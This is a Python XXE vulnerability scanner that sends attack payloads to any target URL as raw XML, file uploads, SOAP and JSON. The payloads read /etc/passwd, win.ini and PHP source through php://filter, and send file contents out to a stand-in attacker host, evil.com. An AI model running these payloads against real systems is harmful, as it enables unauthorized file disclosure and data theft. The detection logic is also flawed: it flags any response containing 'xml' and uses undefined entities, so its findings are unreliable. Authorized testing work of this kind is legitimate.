import requests
import base64
from urllib.parse import urljoin
from colorama import Fore, Style

class XXEScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.common_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/xml'
        }

    def scan_xxe_vulnerabilities(self):
        print(f"\n{Fore.CYAN}[*] Starting XXE Vulnerability Scan...{Style.RESET_ALL}")
        
        try:
            # Check for XXE in XML requests
            self._check_xml_xxe()
            
            # Check for XXE in file uploads
            self._check_file_upload_xxe()
            
            # Check for XXE in SOAP requests
            self._check_soap_xxe()
            
            # Check for XXE in JSON requests
            self._check_json_xxe()
            
            # Print results
            self._print_results()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error scanning for XXE vulnerabilities: {str(e)}{Style.RESET_ALL}")

    def _check_xml_xxe(self):
        # Basic XXE payloads
        basic_payloads = [
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
               <foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
               <foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "http://evil.com/evil.dtd" >]>
               <foo>&xxe;</foo>'''
        ]
        
        # Parameter entity payloads
        param_payloads = [
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
               %xxe;]>
               <foo>&evil;</foo>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ENTITY % file SYSTEM "file:///etc/passwd">
               <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
               %eval;
               %exfil;]>
               <foo>&exfil;</foo>'''
        ]
        
        # Out-of-band payloads
        oob_payloads = [
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
               %xxe;]>
               <foo>&send;</foo>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php">
               <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">
               %eval;
               %exfil;]>
               <foo>&exfil;</foo>'''
        ]
        
        # Test all payloads
        for payload in basic_payloads + param_payloads + oob_payloads:
            try:
                response = requests.post(
                    self.target_url,
                    data=payload,
                    headers=self.common_headers,
                    timeout=10
                )
                
                # Check for file content in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=', '[fonts]', '[extensions]']):
                    self.vulnerabilities.append({
                        'type': 'XML External Entity (XXE)',
                        'severity': 'High',
                        'description': f'File content disclosure through XXE with payload: {payload[:100]}...'
                    })
                
                # Check for error messages indicating XXE
                if any(indicator in response.text.lower() for indicator in ['xml', 'entity', 'external', 'dtd']):
                    self.vulnerabilities.append({
                        'type': 'XML External Entity (XXE) - Error Message',
                        'severity': 'Medium',
                        'description': f'Error message indicates potential XXE vulnerability with payload: {payload[:100]}...'
                    })
            except:
                pass

    def _check_file_upload_xxe(self):
        # XXE payloads in file uploads
        file_payloads = [
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
               <foo>&xxe;</foo>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
               %xxe;]>
               <foo>&evil;</foo>'''
        ]
        
        for payload in file_payloads:
            try:
                files = {
                    'file': ('test.xml', payload, 'application/xml')
                }
                
                response = requests.post(
                    self.target_url,
                    files=files,
                    headers=self.common_headers,
                    timeout=10
                )
                
                # Check for file content in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'XML External Entity (XXE) in File Upload',
                        'severity': 'High',
                        'description': f'File content disclosure through XXE in file upload with payload: {payload[:100]}...'
                    })
            except:
                pass

    def _check_soap_xxe(self):
        # SOAP XXE payloads
        soap_payloads = [
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ELEMENT foo ANY >
               <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
               <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
               <soap:Body>
               <foo>&xxe;</foo>
               </soap:Body>
               </soap:Envelope>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
               <!DOCTYPE foo [
               <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
               %xxe;]>
               <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
               <soap:Body>
               <foo>&evil;</foo>
               </soap:Body>
               </soap:Envelope>'''
        ]
        
        for payload in soap_payloads:
            try:
                response = requests.post(
                    self.target_url,
                    data=payload,
                    headers={
                        **self.common_headers,
                        'SOAPAction': '""'
                    },
                    timeout=10
                )
                
                # Check for file content in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'XML External Entity (XXE) in SOAP',
                        'severity': 'High',
                        'description': f'File content disclosure through XXE in SOAP request with payload: {payload[:100]}...'
                    })
            except:
                pass

    def _check_json_xxe(self):
        # JSON XXE payloads (some APIs accept XML in JSON)
        json_payloads = [
            {
                "xml": '''<?xml version="1.0" encoding="ISO-8859-1"?>
                         <!DOCTYPE foo [
                         <!ELEMENT foo ANY >
                         <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
                         <foo>&xxe;</foo>'''
            },
            
            {
                "xml": '''<?xml version="1.0" encoding="ISO-8859-1"?>
                         <!DOCTYPE foo [
                         <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
                         %xxe;]>
                         <foo>&evil;</foo>'''
            }
        ]
        
        for payload in json_payloads:
            try:
                response = requests.post(
                    self.target_url,
                    json=payload,
                    headers={
                        **self.common_headers,
                        'Content-Type': 'application/json'
                    },
                    timeout=10
                )
                
                # Check for file content in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'XML External Entity (XXE) in JSON',
                        'severity': 'High',
                        'description': f'File content disclosure through XXE in JSON request with payload: {str(payload)[:100]}...'
                    })
            except:
                pass

    def _print_results(self):
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] No XXE vulnerabilities found{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}[!] Found {len(self.vulnerabilities)} potential issues:{Style.RESET_ALL}")
        for vuln in self.vulnerabilities:
            severity_color = {
                'High': Fore.RED,
                'Medium': Fore.YELLOW,
                'Low': Fore.BLUE,
                'Info': Fore.CYAN
            }.get(vuln['severity'], Fore.WHITE)
            
            print(f"\n{severity_color}[{vuln['severity']}] {vuln['type']}{Style.RESET_ALL}")
            print(f"Description: {vuln['description']}") 